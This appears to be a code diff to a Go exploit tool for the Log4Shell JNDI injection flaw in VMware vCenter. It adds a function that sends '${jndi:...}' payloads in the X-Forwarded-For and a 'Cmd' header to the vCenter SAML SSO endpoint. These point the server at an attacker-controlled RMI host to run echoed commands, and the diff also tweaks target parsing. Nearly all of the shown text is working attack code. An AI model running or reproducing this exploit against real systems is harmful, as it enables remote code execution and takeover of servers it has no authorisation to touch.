@@ -74,7 +74,7 @@ func firstCheck(data []byte) bool {
 func StartScan(url string) {
 	wg.Add(1)
 	go rmiServer()
-	check_alive(url)
+	// check_alive(url)
 	target := strings.TrimLeft(url, "https://")
 	local_ip := getIpAddr2(target)
 	fmt.Println("[*] your local IP: " + local_ip)
@@ -127,8 +127,47 @@ func exploit(url, rmiserver string) {
 
 }
 
+func exec_cmd(url, rmiserver, command string) {
+	host := rmiserver
+	client := req.C()
+	client.EnableForceHTTP1()
+	client.EnableInsecureSkipVerify()
+	client.SetTimeout(2 * time.Second)
+	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
+	rmi_server := fmt.Sprintf("${jndi:%s}", host)
+	myheader := map[string]string{
+		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
+		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+		"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+		"Accept-Encoding":           "gzip, deflate",
+		"Upgrade-Insecure-Requests": "1",
+		"X-Forwarded-For":           rmi_server,
+		"Sec-Fetch-Mode":            "navigate",
+		"Sec-Fetch-Site":            "none",
+		"Sec-Fetch-User":            "?1",
+		"Cmd":                       rmi_server + "/TomcatBypass/TomcatEcho",
+	}
+
+	client.R().
+		SetHeaders(myheader).
+		Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
+
+}
+
 func getIpAddr2(url string) string {
-	conn, err := net.Dial("tcp", url+":443")
+
+	tmp := strings.Split(url, ":")
+	port := ""
+	ipaddr := ""
+	if len(tmp) > 1 {
+		ipaddr = tmp[0]
+		port = tmp[1]
+	} else {
+		ipaddr = url
+		port = "443"
+	}
+	fmt.Println(port)
+	conn, err := net.Dial("tcp", ipaddr+":"+port)
 	if err != nil {
 		fmt.Println(err)
 		return ""
